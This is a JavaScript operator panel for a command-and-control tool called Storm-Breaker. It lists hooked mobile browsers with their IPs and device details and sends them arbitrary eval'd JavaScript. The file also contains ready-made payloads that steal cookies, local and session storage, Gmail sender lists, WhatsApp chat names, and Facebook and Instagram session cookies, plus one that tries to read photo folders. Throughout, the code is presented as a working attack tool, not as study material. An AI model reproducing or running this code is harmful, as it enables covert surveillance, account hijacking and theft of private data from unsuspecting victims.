/**
 * Storm-Breaker Mobile Device Control
 * Handles mobile device management and advanced data extraction
 */

let selectedMobileClient = null;
let mobileClients = [];
let mobileRefreshInterval = null;

// Initialize mobile control
function initMobileControl() {
    refreshMobileClients();

    // Auto-refresh every 5 seconds
    mobileRefreshInterval = setInterval(refreshMobileClients, 5000);

    // Refresh button
    document.getElementById('btn-refresh-mobile')?.addEventListener('click', refreshMobileClients);
}

// Refresh mobile clients list
async function refreshMobileClients() {
    try {
        const response = await fetch('/api/mobile/clients');
        const data = await response.json();
        mobileClients = data.clients || [];

        const listEl = document.getElementById('mobile-client-list');
        if (!listEl) return;

        if (mobileClients.length === 0) {
            listEl.innerHTML = '<div class="text-center text-slate-600 py-4 italic">No mobile devices</div>';
            return;
        }

        listEl.innerHTML = mobileClients.map(client => `
            <div class="mobile-client-item ${selectedMobileClient === client.uid ? 'bg-blue-600/20 border-blue-500' : 'bg-slate-800 border-slate-700'} 
                 border rounded-lg p-3 cursor-pointer hover:bg-slate-700 transition-colors"
                 onclick="selectMobileClient('${client.uid}')">
                <div class="flex items-center justify-between mb-2">
                    <span class="text-xs font-bold text-slate-300">${client.uid.substring(0, 20)}...</span>
                    <span class="text-xs px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-400">
                        <i class="fas fa-circle text-[6px]"></i> ${client.seconds_ago}s
                    </span>
                </div>
                <div class="text-xs text-slate-500 space-y-1">
                    <div><i class="fas fa-mobile-alt w-4"></i> ${client.info.platform || 'Unknown'}</div>
                    <div><i class="fas fa-network-wired w-4"></i> ${client.ip}</div>
                    ${client.info.battery ? `<div><i class="fas fa-battery-full w-4"></i> ${client.info.battery.level || 'N/A'}</div>` : ''}
                </div>
            </div>
        `).join('');
    } catch (e) {
        console.error('Failed to refresh mobile clients:', e);
    }
}

// Select mobile client
function selectMobileClient(uid) {
    selectedMobileClient = uid;
    const client = mobileClients.find(c => c.uid === uid);

    if (client) {
        // Show device info
        const infoEl = document.getElementById('mobile-device-info');
        const infoContent = document.getElementById('mobile-info-content');

        if (infoEl && infoContent) {
            infoEl.classList.remove('hidden');
            infoContent.innerHTML = `
                <div class="text-slate-400"><i class="fas fa-user"></i> Platform:</div>
                <div class="text-white">${client.info.platform || 'Unknown'}</div>
                
                <div class="text-slate-400"><i class="fas fa-desktop"></i> Screen:</div>
                <div class="text-white">${client.info.screenWidth}x${client.info.screenHeight}</div>
                
                <div class="text-slate-400"><i class="fas fa-globe"></i> Language:</div>
                <div class="text-white">${client.info.language || 'Unknown'}</div>
                
                <div class="text-slate-400"><i class="fas fa-clock"></i> Timezone:</div>
                <div class="text-white">${client.info.timezone || 'Unknown'}</div>
                
                <div class="text-slate-400"><i class="fas fa-microchip"></i> CPU Cores:</div>
                <div class="text-white">${client.info.cores || 'Unknown'}</div>
                
                <div class="text-slate-400"><i class="fas fa-memory"></i> RAM:</div>
                <div class="text-white">${client.info.memory || 'Unknown'} GB</div>
                
                ${client.info.battery ? `
                    <div class="text-slate-400"><i class="fas fa-battery-full"></i> Battery:</div>
                    <div class="text-white">${client.info.battery.level || 'N/A'} ${client.info.battery.charging ? '⚡' : ''}</div>
                ` : ''}
                
                ${client.info.connection ? `
                    <div class="text-slate-400"><i class="fas fa-wifi"></i> Connection:</div>
                    <div class="text-white">${client.info.connection.type || 'Unknown'}</div>
                ` : ''}
            `;
        }

        addMobileOutput(`✓ Selected device: ${uid}`);
    }

    refreshMobileClients();
}

// Send mobile command
async function sendMobileCommand(command) {
    if (!selectedMobileClient) {
        addMobileOutput('❌ Please select a mobile device first!');
        return;
    }

    addMobileOutput(`📤 Sending command: ${command}`);

    try {
        const response = await fetch('/api/mobile/send_command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                uid: selectedMobileClient,
                command: command
            })
        });

        if (response.ok) {
            addMobileOutput('✓ Command queued, waiting for response...');
            setTimeout(() => getMobileResponse(), 2000);
        } else {
            addMobileOutput('❌ Failed to send command');
        }
    } catch (e) {
        addMobileOutput('❌ Error: ' + e.message);
    }
}

// Get mobile response
async function getMobileResponse() {
    if (!selectedMobileClient) return;

    try {
        const response = await fetch(`/api/mobile/get_response/${selectedMobileClient}`);
        const data = await response.json();

        if (data.output) {
            addMobileOutput('📥 Response:\n' + data.output);
        } else {
            addMobileOutput('⏳ No response yet, retrying...');
            setTimeout(() => getMobileResponse(), 2000);
        }
    } catch (e) {
        addMobileOutput('❌ Error getting response: ' + e.message);
    }
}

// Send custom mobile command
function sendCustomMobileCommand() {
    const input = document.getElementById('mobile-custom-cmd');
    if (!input) return;

    const code = input.value.trim();
    if (!code) {
        addMobileOutput('❌ Please enter JavaScript code');
        return;
    }

    sendMobileCommand('eval:' + code);
    input.value = '';
}

// Add output to mobile console
function addMobileOutput(text) {
    const outputEl = document.getElementById('mobile-output');
    if (!outputEl) return;

    const timestamp = new Date().toLocaleTimeString();
    const line = document.createElement('div');
    line.className = 'text-slate-300';
    line.textContent = `[${timestamp}] ${text}`;

    outputEl.appendChild(line);
    outputEl.scrollTop = outputEl.scrollHeight;
}

// Advanced Extraction Functions

function extractPhotos() {
    if (!selectedMobileClient) {
        addMobileOutput('❌ Please select a mobile device first!');
        return;
    }

    addMobileOutput('🔥 Attempting to extract photos...');

    const code = `
        (async () => {
            try {
                // Request file system access (if supported)
                if ('showDirectoryPicker' in window) {
                    const dirHandle = await window.showDirectoryPicker();
                    let photos = [];
                    for await (const entry of dirHandle.values()) {
                        if (entry.kind === 'file' && entry.name.match(/\\.(jpg|jpeg|png|gif|webp)$/i)) {
                            const file = await entry.getFile();
                            const reader = new FileReader();
                            reader.onload = (e) => {
                                photos.push({name: file.name, data: e.target.result});
                            };
                            reader.readAsDataURL(file);
                        }
                    }
                    return 'Found ' + photos.length + ' photos. Extracting...';
                } else {
                    return 'File System Access API not supported. Try using file input method.';
                }
            } catch (e) {
                return 'Photo extraction error: ' + e.message;
            }
        })();
    `;

    sendMobileCommand('eval:' + code);
}

function extractGmail() {
    if (!selectedMobileClient) {
        addMobileOutput('❌ Please select a mobile device first!');
        return;
    }

    addMobileOutput('🔥 Attempting to extract Gmail data...');

    const code = `
        (async () => {
            try {
                // Check if Gmail is open
                if (window.location.hostname.includes('mail.google.com')) {
                    // Extract email subjects and senders
                    const emails = Array.from(document.querySelectorAll('[role="row"]')).map(row => ({
                        subject: row.querySelector('[data-thread-id]')?.textContent || 'N/A',
                        sender: row.querySelector('[email]')?.getAttribute('email') || 'N/A'
                    }));
                    return 'Extracted ' + emails.length + ' emails: ' + JSON.stringify(emails.slice(0, 5));
                } else {
                    // Try to open Gmail
                    window.open('https://mail.google.com', '_blank');
                    return 'Opening Gmail... Please run this command again after Gmail loads.';
                }
            } catch (e) {
                return 'Gmail extraction error: ' + e.message;
            }
        })();
    `;

    sendMobileCommand('eval:' + code);
}

function extractChrome() {
    if (!selectedMobileClient) {
        addMobileOutput('❌ Please select a mobile device first!');
        return;
    }

    addMobileOutput('🔥 Attempting to extract Chrome data...');

    const code = `
        (async () => {
            try {
                let data = {
                    cookies: document.cookie,
                    localStorage: {...localStorage},
                    sessionStorage: {...sessionStorage},
                    history: window.history.length,
                    userAgent: navigator.userAgent
                };
                
                // Try to get passwords (requires user interaction)
                if ('credentials' in navigator) {
                    data.credentialsAPI = 'Available (requires user interaction)';
                }
                
                return 'Chrome Data: ' + JSON.stringify(data, null, 2);
            } catch (e) {
                return 'Chrome extraction error: ' + e.message;
            }
        })();
    `;

    sendMobileCommand('eval:' + code);
}

function extractWhatsApp() {
    if (!selectedMobileClient) {
        addMobileOutput('❌ Please select a mobile device first!');
        return;
    }

    addMobileOutput('🔥 Attempting to extract WhatsApp data...');

    const code = `
        (async () => {
            try {
                if (window.location.hostname.includes('web.whatsapp.com')) {
                    // Extract chat names
                    const chats = Array.from(document.querySelectorAll('[data-testid="cell-frame-title"]')).map(el => el.textContent);
                    return 'WhatsApp Chats: ' + JSON.stringify(chats.slice(0, 10));
                } else {
                    window.open('https://web.whatsapp.com', '_blank');
                    return 'Opening WhatsApp Web... Please run this command again after it loads.';
                }
            } catch (e) {
                return 'WhatsApp extraction error: ' + e.message;
            }
        })();
    `;

    sendMobileCommand('eval:' + code);
}

function extractFacebook() {
    if (!selectedMobileClient) {
        addMobileOutput('❌ Please select a mobile device first!');
        return;
    }

    addMobileOutput('🔥 Attempting to extract Facebook data...');

    const code = `
        (async () => {
            try {
                if (window.location.hostname.includes('facebook.com')) {
                    // Extract user info
                    const userInfo = {
                        name: document.querySelector('[data-testid="blue_bar_profile_link"]')?.textContent || 'N/A',
                        cookies: document.cookie
                    };
                    return 'Facebook Data: ' + JSON.stringify(userInfo);
                } else {
                    window.open('https://www.facebook.com', '_blank');
                    return 'Opening Facebook... Please run this command again after it loads.';
                }
            } catch (e) {
                return 'Facebook extraction error: ' + e.message;
            }
        })();
    `;

    sendMobileCommand('eval:' + code);
}

function extractInstagram() {
    if (!selectedMobileClient) {
        addMobileOutput('❌ Please select a mobile device first!');
        return;
    }

    addMobileOutput('🔥 Attempting to extract Instagram data...');

    const code = `
        (async () => {
            try {
                if (window.location.hostname.includes('instagram.com')) {
                    // Extract user info
                    const userInfo = {
                        username: document.querySelector('a[href*="/"]')?.textContent || 'N/A',
                        cookies: document.cookie
                    };
                    return 'Instagram Data: ' + JSON.stringify(userInfo);
                } else {
                    window.open('https://www.instagram.com', '_blank');
                    return 'Opening Instagram... Please run this command again after it loads.';
                }
            } catch (e) {
                return 'Instagram extraction error: ' + e.message;
            }
        })();
    `;

    sendMobileCommand('eval:' + code);
}

// Initialize when tab is shown
document.addEventListener('DOMContentLoaded', () => {
    // Watch for mobile tab activation
    const mobileTab = document.querySelector('[data-tab="mobile"]');
    if (mobileTab) {
        mobileTab.addEventListener('click', () => {
            if (!mobileRefreshInterval) {
                initMobileControl();
            }
        });
    }
});
